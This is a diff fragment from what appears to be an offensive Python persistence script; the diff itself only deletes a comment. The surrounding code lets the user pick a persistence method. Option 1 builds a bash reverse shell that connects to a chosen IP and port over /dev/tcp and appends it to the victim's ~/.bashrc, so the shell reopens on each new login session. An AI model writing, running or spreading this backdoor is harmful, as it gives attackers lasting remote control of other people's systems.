@@ -22,7 +22,7 @@ per = input('''Enter which persistence you want(1,2,3):
 if per == '1':
 
     command = f"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"
-    # Use echo to add the command to .bashrc
+    
     os.system(f'echo "{command}" >> ~/.bashrc')
     print(".bashrc Persistence added.")
 
